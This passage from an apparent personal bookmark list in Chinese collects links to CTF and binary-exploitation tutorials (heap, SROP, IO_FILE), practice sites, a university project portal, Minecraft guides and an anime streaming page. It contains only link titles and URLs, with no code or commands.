AWD比赛指导手册和脚本整理](https://github.com/AabyssZG/AWD-Guide)\n\n[CTF-pwn pwntools用法探索](https://www.xjx100.cn/news/262545.html?action=onClick)\n\n[Index of /ubuntu-releases/ | 清华大学开源软件镜像站 ](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/)\n\n# CTF工具站：\n\n[在线工具](http://www.hiencode.com/)\n\n[CTF站点导航](https://ctf.mzy0.com/)\n\n[MD5碰撞](https://www.somd5.com/)\n\n# CTF刷题/比赛站\n\n[攻防世界](https://adworld.xctf.org.cn/home/index?rwNmOdr=1686891778736)\n\n[BUU](https://buuoj.cn/)\n\n[DataCon](https://datacon.qianxin.com/competition/competitions/53/introductionhttps://datacon.qianxin.com/competition/competitions/53/introduction)\n\n[PolarD&N](https://polarctf.com/#/page/convert)\n\n[ACTF](https://adworld.xctf.org.cn/match/list?event_hash=706a7a8c-65a0-11ee-ab28-000c29bc20bf)\n\n# 堆\n\n[Tcache bin](https://blog.csdn.net/A951860555/article/details/115442780)\n\n[ctfwiki](https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack.md)\n\n[hook](https://blog.csdn.net/A951860555/article/details/115766826)\n\n[pwn | 堆结构](https://www.cnblogs.com/Mz1-rc/p/17023153.html)\n\n[Unsortedbin Attack ](https://www.52pojie.cn/thread-1467962-1-1.html)\n\n[House of orange ](https://www.wenjiangs.com/doc/6ki1sx0l)\n\n[house of orange](https://blog.csdn.net/aptx4869_li/article/details/122971995)2\n\n[House of orange 3](https://www.wenjiangs.com/doc/6ki1sx0l#EXPlb2.2)\n\n# SROP\n\n[系统调用号](https://blog.csdn.net/winter2121/article/details/119845443)\n\n[Linux SROP 原理与攻击](https://blog.csdn.net/qq_31481187/article/details/73929569)\n\n[[syscall系统调用的简单分析](https://baijiahao.baidu.com/s?id=1658134769561601465&wfr=spider&for=pc)g)\n\n# IOlife\n\n[浅析IOFILE结构及利用](https://blog.csdn.net/w12315q/article/details/84328447)\n\n[HCTF2018 the_end&&babyprintf_var2 Writeup - 知乎](https://zhuanlan.zhihu.com/p/49773291)\n\n[好好说话之IO_FILE利用（1](https://blog.csdn.net/qq_41202237/article/details/113845320)\n\n# C++\n\n[例题1](https://mp.weixin.qq.com/s/Tcu45BJj3JTqD0Pvw1HYng)\n\n# 其他\n\n[Linux学习](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzI5MDk3NTAxNw==&scene=23&album_id=3033094806944350211&count=3#wechat_redirect)\n\n[命令绕过](https://www.yii666.com/blog/338731.html)\n\n[[原创\\]关于不同版本 glibc 更换的一些问题-](https://bbs.kanxue.com/thread-254868.htm)\n\n# 大创\n\n[结题报告 - 列表 | 西北工业大学大学生创新创业训练计划项目管理系统](https://cxcy.nwpu.edu.cn/XM/JieTi/Declare/Index)\n\n[三航杯](https://www.sanhangcup.com/#/student/information)\n\n# 学习无关\n\n## 我的世界\n\n[2022年最新Minecraft村民的职业与交易详解指南](https://baijiahao.baidu.com/s?id=1724382693956990325&wfr=spider&for=pc)\n\n[我的世界药水配方大全2023 最新常用药水配方汇总-骑士助手](https://www.vqs.com/article/10022.html)\n\n[我的世界药水合成表大全 药水合成配方图表汇总_历趣](https://www.liqucn.com/article/270749.shtml)\n\n## 数模\n\n[速成 | 遗传算法详解及其MATLAB实现|代数|算子|matlab_网易订阅](https://www.163.com/dy/article/I6VDJTPR05530N05.html)\n\n## 不知道什么时候想看的剧\n\n[间谍过家家 第二季第01集高速①免费在线播放 - 谍战迷](http://www.diezhanba.me/dongman/jiandieguojiajia_dierji/play-0-0.html)\n"}]